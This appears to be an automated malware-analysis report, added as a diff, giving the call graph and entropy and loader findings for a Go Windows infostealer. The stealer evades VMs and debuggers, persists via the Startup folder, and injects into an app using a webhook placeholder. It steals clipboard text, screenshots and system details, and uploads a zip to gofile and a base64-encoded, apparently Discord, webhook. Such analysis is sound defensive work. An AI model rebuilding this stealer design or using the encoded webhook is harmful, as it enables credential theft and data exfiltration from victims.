@@ -1,0 +1,513 @@
+main.main
+  0x140364180 -> main.antiany
+  0x140364192 -> sync.(*WaitGroup).Add
+  0x1403641e9 -> sync.(*WaitGroup).Add
+  0x1403642c9 -> sync.(*WaitGroup).Add
+  0x140364320 -> sync.(*WaitGroup).Add
+  0x140364377 -> sync.(*WaitGroup).Add
+  0x1403643d2 -> encoding/base64.(*Encoding).DecodeString
+  0x140364446 -> os.Getenv("LOCALAPPDATA")
+  0x140364671 -> os.Getenv("APPDATA")
+  0x140364893 -> os.Getenv("LOCALAPPDATA")
+  0x140364ac0 -> os.Getenv("LOCALAPPDATA")
+  0x140364cf1 -> os.Getenv("APPDATA")
+  0x1403650c8 -> sync.(*WaitGroup).Add
+  0x140365120 -> sync.(*WaitGroup).Add
+  0x140365177 -> sync.(*WaitGroup).Add
+  0x1403651cc -> sync.(*WaitGroup).Add
+  0x140365221 -> sync.(*WaitGroup).Add
+  0x140365277 -> sync.(*WaitGroup).Add
+  0x1403652cc -> sync.(*WaitGroup).Add
+  0x140365321 -> sync.(*WaitGroup).Add
+  0x140365377 -> sync.(*WaitGroup).Add
+  0x14036542b -> sync.(*WaitGroup).Add
+  0x140365440 -> sync.(*WaitGroup).Add
+  0x140365546 -> sync.(*WaitGroup).Wait
+  0x1403655d7 -> os.Getenv("TEMP")
+  0x140365636 -> path/filepath.join
+  0x140365688 -> path/filepath.join
+  0x14036569a -> main.createLogFile2
+  0x1403656a7 -> sync.(*WaitGroup).Wait
+  0x140365777 -> path/filepath.join
+  0x140365780 -> main.zipFolder
+  0x1403657c6 -> log.Fatal
+  0x1403657d8 -> main.gofileUpload
+  0x1403657ef -> main.sendWebhook
+  0x140365800 -> os.Exit
+main.antiany
+  0x1403632e6 -> os.UserHomeDir
+  0x140363335 -> path/filepath.join
+  0x1403633a6 -> io/ioutil.ReadDir
+  0x140363430 -> indirect_call
+  0x14036344b -> indirect_call
+  0x1403634a0 -> os.Exit
+  0x140363515 -> strings.EqualFold
+main.main.func1
+  0x140366daf -> main.hideConsole1
+  0x140366db4 -> main.hideConsole2
+  0x140366dc6 -> indirect_call -> main.main.func1.1
+main.hideConsole1
+  0x14035c5c2 -> syscall.(*LazyProc).Call
+  0x14035c600 -> syscall.(*LazyProc).Call
+main.hideConsole2
+  0x14035c642 -> syscall.(*LazyProc).Call
+  0x14035c680 -> syscall.(*LazyProc).Call
+main.main.func1.1
+  0x140366e21 -> sync.(*WaitGroup).Done
+main.main.func2
+  0x140366caf -> main.getDrives
+  0x140366cc1 -> indirect_call -> main.main.func2.1
+main.getDrives
+  0x140362d22 -> os.OpenFile
+main.main.func2.1
+  0x140366d21 -> sync.(*WaitGroup).Done
+main.main.func3
+  0x140366baf -> main.antidebugger
+  0x140366bc1 -> indirect_call -> main.main.func3.1
+main.antidebugger
+  0x140363f66 -> main.test
+  0x14036405a -> encoding/base64.(*Encoding).DecodeString
+  0x140364079 -> strings.ToLower
+  0x1403640a5 -> strings.ToLower
+  0x1403640c0 -> strings.Index
+  0x1403640d3 -> os.Exit
+main.test
+  0x140362e59 -> encoding/base64.(*Encoding).DecodeString
+  0x140362e80 -> encoding/base64.(*Encoding).DecodeString
+  0x140362e99 -> os/exec.Command
+  0x140362ea0 -> os/exec.(*Cmd).Output
+  0x140362ec7 -> strings.genSplit("\n")
+  0x140362f36 -> strings.TrimSpace
+  0x140362f84 -> strings.Fields
+main.main.func3.1
+  0x140366c21 -> sync.(*WaitGroup).Done
+main.main.func4
+  0x140366aaf -> main.CaptureScreenshots
+  0x140366ac1 -> indirect_call -> main.main.func4.1
+main.CaptureScreenshots
+  0x14035c032 -> os.Getenv("TEMP")
+  0x14035c084 -> path/filepath.join
+  0x14035c098 -> os.Mkdir
+  0x14035c0a0 -> github.com/kbinani/screenshot.NumActiveDisplays
+  0x14035c0d1 -> github.com/kbinani/screenshot.CaptureDisplay
+  0x14035c11a -> fmt.Sprintf("screen_%d_screenshot.png")
+  0x14035c159 -> path/filepath.join
+  0x14035c169 -> os.OpenFile
+  0x14035c1e6 -> image/png.(*Encoder).Encode
+github.com/kbinani/screenshot.NumActiveDisplays
+  0x140336810 -> syscall.compileCallback
+  0x140336842 -> syscall.Syscall6
+github.com/kbinani/screenshot.CaptureDisplay
+  0x140335bb4 -> github.com/kbinani/screenshot.GetDisplayBounds
+  0x140335bb9 -> github.com/kbinani/screenshot.CaptureRect
+github.com/kbinani/screenshot.GetDisplayBounds
+  0x1403368a5 -> syscall.compileCallback
+  0x1403368d7 -> syscall.Syscall6
+github.com/kbinani/screenshot.CaptureRect
+  0x140335bfa -> github.com/kbinani/screenshot.Capture
+github.com/kbinani/screenshot.Capture
+  0x140335cd1 -> github.com/kbinani/screenshot/internal/util.CreateImage
+  0x140335cfa -> syscall.Syscall
+  0x140335d04 -> github.com/lxn/win.GetDC
+  0x140335d7a -> github.com/lxn/win.CreateCompatibleDC
+  0x140335de8 -> github.com/lxn/win.CreateCompatibleBitmap
+  0x140335ec9 -> github.com/lxn/win.GlobalAlloc
+  0x140335f12 -> github.com/lxn/win.GlobalLock
+  0x140335f67 -> github.com/lxn/win.SelectObject
+  0x140336007 -> github.com/lxn/win.BitBlt
+  0x140336040 -> github.com/lxn/win.GetDIBits
+github.com/kbinani/screenshot/internal/util.CreateImage
+  0x14031d187 -> image.NewRGBA
+  0x14031d1a0 -> indirect_call -> github.com/kbinani/screenshot/internal/util.CreateImage.func1
+github.com/kbinani/screenshot/internal/util.CreateImage.func1
+  <no direct calls>
+github.com/lxn/win.GetDC
+  0x140335449 -> golang.org/x/sys/windows.(*LazyProc).Find
+  0x14033546f -> syscall.Syscall
+github.com/lxn/win.CreateCompatibleDC
+  0x14032e709 -> golang.org/x/sys/windows.(*LazyProc).Find
+  0x14032e72f -> syscall.Syscall
+github.com/lxn/win.CreateCompatibleBitmap
+  0x14032e651 -> golang.org/x/sys/windows.(*LazyProc).Find
+  0x14032e682 -> syscall.Syscall
+github.com/lxn/win.GlobalAlloc
+  0x14032facd -> golang.org/x/sys/windows.(*LazyProc).Find
+  0x14032faf8 -> syscall.Syscall
+github.com/lxn/win.GlobalLock
+  0x14032fbe9 -> golang.org/x/sys/windows.(*LazyProc).Find
+  0x14032fc0f -> syscall.Syscall
+github.com/lxn/win.SelectObject
+  0x14032e9ee -> golang.org/x/sys/windows.(*LazyProc).Find
+  0x14032ea16 -> syscall.Syscall
+github.com/lxn/win.BitBlt
+  0x14032e506 -> golang.org/x/sys/windows.(*LazyProc).Find
+  0x14032e580 -> syscall.Syscall9
+github.com/lxn/win.GetDIBits
+  0x14032e900 -> golang.org/x/sys/windows.(*LazyProc).Find
+  0x14032e952 -> syscall.Syscall9
+main.main.func4.1
+  0x140366b21 -> sync.(*WaitGroup).Done
+main.main.func5
+  0x1403669b3 -> main.isConnectedToInternet
+  0x1403669c0 -> os.Exit
+  0x1403669d2 -> indirect_call -> main.main.func5.1
+main.isConnectedToInternet
+  0x14035e547 -> net/http.(*Client).Get
+main.main.func5.1
+  0x140366a21 -> sync.(*WaitGroup).Done
+main.main.func6
+  0x1403668af -> main.bypassTokenProtector
+  0x1403668c1 -> indirect_call -> main.main.func6.1
+main.bypassTokenProtector
+  0x14035a635 -> os.Getenv("APPDATA")
+  0x14035a687 -> path/filepath.join
+  0x14035a6e3 -> path/filepath.join
+  0x14035a6f2 -> os.Stat
+  0x14035a711 -> os.underlyingErrorIs
+  0x14035a802 -> path/filepath.join
+  0x14035a807 -> os.Remove
+  0x14035a835 -> os.ReadFile
+  0x14035a883 -> encoding/json.Unmarshal
+  0x14035acc5 -> encoding/json.MarshalIndent("  ")
+  0x14035ace8 -> os.WriteFile
+main.main.func6.1
+  0x140366921 -> sync.(*WaitGroup).Done
+main.main.func7
+  0x1403667af -> main.inj
+  0x1403667c1 -> indirect_call -> main.main.func7.1
+main.inj
+  0x140359cf9 -> encoding/base64.(*Encoding).DecodeString
+  0x140359dfa -> os.Getenv("LOCALAPPDATA")
+  0x140359e36 -> path/filepath.join
+  0x140359e45 -> os.Stat
+  0x140359ed1 -> path/filepath.Walk -> main.inj.func1
+main.inj.func1
+  0x140359fb7 -> encoding/base64.(*Encoding).DecodeString
+  0x140359fdd -> indirect_call
+  0x14035a020 -> strings.Index
+  0x14035a043 -> io/ioutil.ReadDir
+  0x14035a0d1 -> indirect_call
+  0x14035a120 -> strings.Index
+  0x14035a160 -> indirect_call
+  0x14035a1b4 -> path/filepath.join
+  0x14035a1e0 -> encoding/base64.(*Encoding).DecodeString
+  0x14035a20e -> encoding/base64.(*Encoding).DecodeString
+  0x14035a26b -> main.getContent
+  0x14035a2a1 -> os.WriteFile
+main.getContent
+  0x14035a3b5 -> net/http.(*Client).Get
+  0x14035a42a -> io.ReadAll
+  0x14035a454 -> indirect_call -> main.getContent.func1
+  0x14035a4aa -> strings.Replace("%WEBHOOK%")
+  0x14035a4cf -> indirect_call
+main.getContent.func1
+  0x14035a5c9 -> indirect_call
+main.main.func7.1
+  0x140366821 -> sync.(*WaitGroup).Done
+main.main.func9
+  0x14036628f -> main.notepad
+  0x1403662a1 -> indirect_call -> main.main.func9.1
+main.notepad
+  0x1403635a9 -> os.Getenv("TEMP")
+  0x1403635d9 -> os.MkdirAll
+  0x140363643 -> path/filepath.join
+  0x140363675 -> main.killProcessByName("notepad.exe")
+  0x140363686 -> os.Getenv("LOCALAPPDATA")
+  0x1403636d8 -> path/filepath.join
+  0x14036372a -> path/filepath.join
+  0x140363731 -> path/filepath.globWithLimit
+  0x140363830 -> os.ReadFile
+  0x140363976 -> bytes.Index
+  0x1403639b5 -> bytes.Index
+  0x140363ab3 -> golang.org/x/text/encoding/unicode.utf16Encoding.NewDecoder
+  0x140363b00 -> golang.org/x/text/encoding.(*Decoder).Bytes
+  0x140363b39 -> strings.Repeat("=")
+  0x140363c1a -> main.appendToFile
+  0x140363c50 -> bytes.Index
+  0x140363c89 -> bytes.Index
+  0x140363d79 -> golang.org/x/text/encoding/unicode.utf16Encoding.NewDecoder
+  0x140363dc2 -> golang.org/x/text/encoding.(*Decoder).Bytes
+  0x140363de8 -> strings.Repeat("=")
+  0x140363e38 -> main.appendToFile
+  0x140363e60 -> main.notepad.func1
+main.killProcessByName
+  0x140363280 -> os/exec.Command("taskkill")
+  0x140363285 -> os/exec.(*Cmd).Run
+golang.org/x/text/encoding/unicode.utf16Encoding.NewDecoder
+  <no direct calls>
+golang.org/x/text/encoding.(*Decoder).Bytes
+  0x140355701 -> golang.org/x/text/transform.doAppend
+golang.org/x/text/transform.doAppend
+  0x140355175 -> indirect_call
+  0x140355288 -> indirect_call
+main.appendToFile
+  0x1403630a2 -> os.OpenFile
+  0x1403630f9 -> os.(*File).Write
+  0x140363112 -> indirect_call -> main.appendToFile.func1
+main.appendToFile.func1
+  0x1403631c1 -> os.(*File).Close
+main.notepad.func1
+  <no direct calls>
+main.main.func9.1
+  0x140366301 -> sync.(*WaitGroup).Done
+main.main.func10
+  0x140366193 -> main.IsScreenSmall
+  0x1403661a0 -> os.Exit
+  0x1403661b2 -> indirect_call -> main.main.func10.1
+main.IsScreenSmall
+  0x14035cca0 -> syscall.(*LazyProc).Call
+  0x14035cccd -> syscall.(*LazyProc).Call
+main.main.func10.1
+  0x140366201 -> sync.(*WaitGroup).Done
+main.main.func11
+  0x14036608f -> main.VMComputerUsername
+  0x1403660a1 -> indirect_call -> main.main.func11.1
+main.VMComputerUsername
+  0x14035ad84 -> os.Getenv("USERPROFILE")
+  0x14035ad89 -> path/filepath.Base
+  0x14035ae00 -> os.Exit
+main.main.func11.1
+  0x140366101 -> sync.(*WaitGroup).Done
+main.main.func12
+  0x140365f8f -> main.startup
+  0x140365fa1 -> indirect_call -> main.main.func12.1
+main.startup
+  0x14035bd14 -> path/filepath.abs
+  0x14035bd23 -> main.getStartupFolder
+  0x14035bd40 -> path/filepath.Base
+  0x14035bd80 -> path/filepath.join
+  0x14035bd95 -> main.copyfile1
+main.getStartupFolder
+  0x14035bdf2 -> os.Getenv("USERPROFILE")
+  0x14035be0f -> fmt.Errorf("unable to determine user profile directory")
+  0x14035bf0c -> path/filepath.join
+main.copyfile1
+  0x14035bf64 -> os.ReadFile
+  0x14035bf88 -> os.WriteFile
+main.main.func12.1
+  0x140366001 -> sync.(*WaitGroup).Done
+main.main.func13
+  0x140365e93 -> main.RegistryCheck
+  0x140365ea0 -> os.Exit
+  0x140365eb2 -> indirect_call -> main.main.func13.1
+main.RegistryCheck
+  0x14035ae92 -> encoding/base64.(*Encoding).DecodeString
+  0x14035aeb7 -> encoding/base64.(*Encoding).DecodeString
+  0x14035aee0 -> golang.org/x/sys/windows/registry.OpenKey
+  0x14035af23 -> golang.org/x/sys/windows/registry.Key.GetStringValue
+  0x14035af46 -> strings.Index("VMware")
+  0x14035af70 -> strings.Index("VBOX")
+  0x14035af8f -> indirect_call -> main.RegistryCheck.func1
+  0x14035afbb -> indirect_call
+main.RegistryCheck.func1
+  0x14035b041 -> golang.org/x/sys/windows/registry.Key.Close
+main.main.func13.1
+  0x140365f01 -> sync.(*WaitGroup).Done
+main.main.func14
+  0x140365d8f -> main.ClipboardStealer
+  0x140365da1 -> indirect_call -> main.main.func14.1
+main.ClipboardStealer
+  0x14035b367 -> os/exec.Command("powershell")
+  0x14035b36c -> os/exec.(*Cmd).Output
+  0x14035b398 -> main.createLogFile("Clipboard.txt", "Error while getting clipboard")
+  0x14035b3b4 -> strings.TrimSpace
+  0x14035b3cb -> main.createLogFile("Clipboard.txt")
+main.createLogFile
+  0x14035c30c -> os.Getenv("TEMP")
+  0x14035c355 -> path/filepath.join
+  0x14035c369 -> os.Mkdir
+  0x14035c3c0 -> path/filepath.join
+  0x14035c3d0 -> os.OpenFile
+  0x14035c42f -> os.(*File).Write
+  0x14035c44f -> indirect_call -> main.createLogFile.func1
+  0x14035c481 -> indirect_call
+main.createLogFile.func1
+  0x14035c561 -> os.(*File).Close
+main.main.func14.1
+  0x140365e01 -> sync.(*WaitGroup).Done
+main.main.func15
+  0x140365c8f -> main.GlobalInfo
+  0x140365ca1 -> indirect_call -> main.main.func15.1
+main.GlobalInfo
+  0x14035cd60 -> main.GetProductKey
+  0x14035cd88 -> encoding/base64.(*Encoding).DecodeString
+  0x14035ce18 -> net/http.(*Client).Get
+  0x14035cf14 -> encoding/json.(*Decoder).Decode
+  0x14035cfd9 -> strings.genSplit(",")
+  0x14035d020 -> os.UserHomeDir
+  0x14035d08c -> strings.ToLower
+  0x14035d1a1 -> main.getInstalledAntivirus
+  0x14035d1c0 -> main.getCurrentWindowsLanguage
+  0x14035d1e0 -> strings.ToUpper
+  0x14035d1f5 -> main.hostname
+  0x14035d4ce -> fmt.Sprintf
+  0x14035d510 -> os.Getenv("TEMP")
+  0x14035d562 -> path/filepath.join
+  0x14035d5b4 -> path/filepath.join
+  0x14035d5c6 -> main.createLogFile2
+  0x14035d5db -> indirect_call -> main.GlobalInfo.func1
+  0x14035d5fd -> indirect_call
+  0x14035d620 -> indirect_call
+main.GetProductKey
+  0x14035ca62 -> encoding/base64.(*Encoding).DecodeString
+  0x14035ca87 -> golang.org/x/sys/windows/registry.OpenKey
+  0x14035cac7 -> golang.org/x/sys/windows/registry.Key.GetStringValue
+  0x14035caf3 -> indirect_call -> main.GetProductKey.func1
+  0x14035cb20 -> indirect_call
+main.GetProductKey.func1
+  0x14035cba1 -> golang.org/x/sys/windows/registry.Key.Close
+main.getInstalledAntivirus
+  0x14035c779 -> encoding/base64.(*Encoding).DecodeString
+  0x14035c7f1 -> os/exec.Command("PowerShell")
+  0x14035c843 -> os/exec.(*Cmd).Run
+  0x14035c8b0 -> strings.genSplit("<nil>", "\n")
+  0x14035c94f -> strings.TrimSpace
+main.getCurrentWindowsLanguage
+  0x14035c6c2 -> syscall.(*LazyProc).Call
+  0x14035c70f -> fmt.Sprintf("%04x")
+main.hostname
+  0x14035d773 -> os.hostname
+main.createLogFile2
+  0x140361fcd -> os.WriteFile
+  0x14036202f -> fmt.Fprintf("File '%s' created successfully.\n")
+main.GlobalInfo.func1
+  0x14035d729 -> indirect_call
+main.main.func15.1
+  0x140365d01 -> sync.(*WaitGroup).Done
+main.main.func16
+  0x140365ba0 -> os.Getenv("COMPUTERNAME")
+  0x140365ba5 -> main.checkUsername
+  0x140365bb7 -> indirect_call -> main.main.func16.1
+main.checkUsername
+  0x14035b127 -> os.Exit
+main.main.func16.1
+  0x140365c01 -> sync.(*WaitGroup).Done
+main.main.func17
+  0x140365a8f -> main.checkDLL
+  0x140365aa1 -> indirect_call -> main.main.func17.1
+main.checkDLL
+  0x14035b1b2 -> os.Getenv("SystemRoot")
+  0x14035b237 -> path/filepath.join
+  0x14035b288 -> path/filepath.join
+  0x14035b2a1 -> os.Stat
+  0x14035b2b5 -> os.Stat
+  0x14035b2c4 -> os.Exit
+  0x14035b2d0 -> os.Exit
+main.main.func17.1
+  0x140365b01 -> sync.(*WaitGroup).Done
+main.zipFolder
+  0x14035b460 -> os.Getenv("TEMP")
+  0x14035b4c0 -> path/filepath.join
+  0x14035b4cf -> os.OpenFile
+  0x14035b6c0 -> path/filepath.Walk -> main.zipFolder.func1
+  0x14035b6ea -> indirect_call
+  0x14035b6fc -> indirect_call
+  0x14035b75a -> indirect_call
+  0x14035b76c -> indirect_call
+main.zipFolder.func1
+  0x14035b8d9 -> indirect_call
+  0x14035b940 -> path/filepath.join
+  0x14035b9a1 -> path/filepath.Rel
+  0x14035b9ba -> archive/zip.(*Writer).Create
+  0x14035b9e8 -> os.OpenFile
+  0x14035ba48 -> io.copyBuffer
+  0x14035ba6f -> indirect_call -> main.zipFolder.func1.1
+  0x14035baa4 -> indirect_call
+main.zipFolder.func1.1
+  0x14035bbe1 -> os.(*File).Close
+main.gofileUpload
+  0x14035d820 -> main.getServerURL
+  0x14035d834 -> indirect_call -> main.gofileUpload.func1
+  0x14035d840 -> main.getServerURL
+  0x14035d8eb -> os/exec.Command("curl")
+  0x14035d8f0 -> os/exec.(*Cmd).Output
+  0x14035d93a -> encoding/json.Unmarshal
+main.getServerURL
+  0x14035e29a -> net/http.(*Client).Get
+  0x14035e380 -> encoding/json.(*Decoder).Decode
+  0x14035e3aa -> indirect_call -> main.getServerURL.func1
+  0x14035e41c -> indirect_call
+main.getServerURL.func1
+  0x14035e4e9 -> indirect_call
+main.gofileUpload.func1
+  0x14035da4b -> os.OpenFile
+  0x14035dac0 -> mime/multipart.randomBoundary
+  0x14035db66 -> mime/multipart.(*Writer).CreateFormFile
+  0x14035db8c -> io.copyBuffer
+  0x14035dba2 -> mime/multipart.(*Writer).Close
+  0x14035dbea -> net/http.NewRequestWithContext("POST")
+  0x14035dc08 -> mime/multipart.(*Writer).FormDataContentType
+  0x14035dc40 -> net/textproto.CanonicalMIMEHeaderKey("Content-Type")
+  0x14035dd01 -> net/http.(*Client).do
+  0x14035dda3 -> io.ReadAll
+  0x14035ddfa -> encoding/json.Unmarshal
+main.sendWebhook
+  0x14036744c -> encoding/base64.(*Encoding).DecodeString
+  0x140367474 -> encoding/base64.(*Encoding).DecodeString
+  0x140367a54 -> encoding/json.Marshal
+  0x140367a89 -> encoding/base64.(*Encoding).DecodeString("YUhSMGNITTZMeTlrYVhOamIzSmtMbU52YlM5aGNHa3ZkMlZpYUc5dmEzTXZNVEl4TlRjeE9ETTNNRFEwT0RVd05qazNNaTgzUmpFd2RGQXRWVXBmY0ZnNVYybDRWbVZUVm5ob1UxcEtZME53YlRNeWRERnhRalZsVm5VeVpWbHpTVXhyTXpCalVIYzNVbVpIU2tvdFNETnNVVTVhVm1kbFZBPT0=")
+  0x140367ab4 -> encoding/base64.(*Encoding).DecodeString
+  0x140367b51 -> net/http.(*Client).Post
+  0x140367b92 -> log.Fatal
+  0x140367bab -> indirect_call
+  0x140367bb9 -> os.Getenv("TEMP")
+  0x140367c0b -> path/filepath.join
+  0x140367c10 -> os.Remove
+
+Semantic analysis
+  assessment_hints:
+    - Reachable code references suspicious high-entropy or magic-containing data blobs.
+    - Reachable functions contain byte transformation loops that may decode strings, configs, or payloads at runtime.
+    - The binary contains behavior consistent with dynamic code allocation and execution.
+  mid_function_control_transfers:
+    - main.GlobalInfo:0x14035d22a call -> runtime.duffzero+0x118 classification=go_runtime_duff_helper
+    - main.getStartupFolder:0x14035be4a call -> runtime.duffzero+0x142 classification=go_runtime_duff_helper
+    - main.main:0x140364415 call -> runtime.duffzero+0xf4 classification=go_runtime_duff_helper
+    - main.main:0x140364f31 call -> runtime.duffzero+0x14b classification=go_runtime_duff_helper
+    - main.main:0x1403656ca call -> runtime.duffzero+0x14b classification=go_runtime_duff_helper
+    - main.notepad:0x140363b54 call -> runtime.duffzero+0x14b classification=go_runtime_duff_helper
+    - main.zipFolder:0x14035b5ca call -> runtime.duffzero+0x150 classification=go_runtime_duff_helper
+  indirect_calls:
+    - github.com/kbinani/screenshot/internal/util.CreateImage:0x14031d1a0 call rcx [interface_method_or_object_dispatch] evidence=target comes from register RCX; target uses register-indirect memory addressing
+    - golang.org/x/text/transform.doAppend:0x140355175 call rdx [interface_method_or_object_dispatch] evidence=target comes from register RDX; target uses register-indirect memory addressing
+    - golang.org/x/text/transform.doAppend:0x140355288 call r12 [unresolved_indirect_call] evidence=target comes from register unknown
+    - main.GetProductKey:0x14035caf3 call rax [interface_method_or_object_dispatch] evidence=target comes from register RAX; target uses register-indirect memory addressing
+    - main.GetProductKey:0x14035cb20 call rax [interface_method_or_object_dispatch] evidence=target comes from register RAX; target uses register-indirect memory addressing
+    - main.GlobalInfo:0x14035d5db call rcx [interface_method_or_object_dispatch] evidence=target comes from register RCX; target uses register-indirect memory addressing
+    - main.GlobalInfo:0x14035d5fd call rax [interface_method_or_object_dispatch] evidence=target comes from register RAX; target uses register-indirect memory addressing
+    - main.GlobalInfo:0x14035d620 call rax [interface_method_or_object_dispatch] evidence=target comes from register RAX; target uses register-indirect memory addressing
+    - main.GlobalInfo.func1:0x14035d729 call rcx [interface_method_or_object_dispatch] evidence=target comes from register RCX; target uses register-indirect memory addressing
+    - main.RegistryCheck:0x14035af8f call rax [interface_method_or_object_dispatch] evidence=target comes from register RAX; target uses register-indirect memory addressing
+  suspicious_data_blobs:
+    - blob_0 .data:0x14047b000 size=0x3000 entropy=7.995 reasons=high_entropy refs=<none>
+    - blob_1 .data:0x140487000 size=0x1000 entropy=7.292 reasons=high_entropy refs=<none>
+    - blob_2 .data:0x14048d000 size=0x2000 entropy=7.954 reasons=high_entropy refs=<none>
+    - blob_3 .rdata:0x1404fa000 size=0x1000 entropy=2.824 reasons=contains_magic_bytes refs=<none>
+    - blob_4 .rdata:0x140554000 size=0x2000 entropy=4.49 reasons=contains_magic_bytes refs=<none>
+    - blob_5 .rdata:0x140580000 size=0x1000 entropy=5.606 reasons=contains_magic_bytes refs=<none>
+    - blob_6 .rdata:0x140583000 size=0x15000 entropy=7.96 reasons=contains_magic_bytes,high_entropy refs=<none>
+    - blob_7 .rdata:0x1406cc000 size=0x1000 entropy=5.714 reasons=contains_magic_bytes refs=<none>
+    - blob_8 .rdata:0x1406f7000 size=0x1000 entropy=5.621 reasons=contains_magic_bytes refs=<none>
+    - blob_9 .rdata:0x140755000 size=0x1000 entropy=5.319 reasons=contains_magic_bytes refs=<none>
+  data_transformers:
+    - main.main ops=add,base64,bytes_to_string,shift,sub,xor confidence=medium sources=<unknown>
+    - main.main.func1 ops=add,sub confidence=medium sources=<unknown>
+    - main.main.func2 ops=add,sub confidence=medium sources=<unknown>
+    - main.main.func3 ops=add,sub confidence=medium sources=<unknown>
+    - main.antidebugger ops=add,base64,bytes_to_string,sub,xor confidence=medium sources=<unknown>
+    - main.test ops=add,base64,bytes_to_string,shift,sub,xor confidence=medium sources=<unknown>
+    - main.main.func4 ops=add,sub confidence=medium sources=<unknown>
+    - github.com/kbinani/screenshot.Capture ops=add,shift,sub,xor confidence=medium sources=<unknown>
+    - github.com/kbinani/screenshot/internal/util.CreateImage ops=add,sub confidence=medium sources=<unknown>
+    - main.main.func5 ops=add,sub,xor confidence=medium sources=<unknown>
+  loader_behaviors:
+    - <reachable_component> kind=dynamic_code_loader confidence=high evidence=dynamic_syscall_call,executable_memory_requested,raw_syscall
+    - main.hideConsole1 kind=suspicious_runtime_behavior confidence=low evidence=dynamic_syscall_call
+    - main.hideConsole2 kind=suspicious_runtime_behavior confidence=low evidence=dynamic_syscall_call
+    - github.com/kbinani/screenshot.NumActiveDisplays kind=suspicious_runtime_behavior confidence=low evidence=raw_syscall
+    - github.com/kbinani/screenshot.GetDisplayBounds kind=suspicious_runtime_behavior confidence=low evidence=raw_syscall
+    - github.com/kbinani/screenshot.Capture kind=dynamic_code_loader confidence=high evidence=executable_memory_requested,raw_syscall
+    - github.com/lxn/win.GetDC kind=dynamic_code_loader confidence=medium evidence=executable_memory_requested,raw_syscall
+    - github.com/lxn/win.CreateCompatibleDC kind=dynamic_code_loader confidence=medium evidence=executable_memory_requested,raw_syscall
+    - github.com/lxn/win.CreateCompatibleBitmap kind=dynamic_code_loader confidence=medium evidence=executable_memory_requested,raw_syscall
+    - github.com/lxn/win.GlobalAlloc kind=dynamic_code_loader confidence=medium evidence=executable_memory_requested,raw_syscall
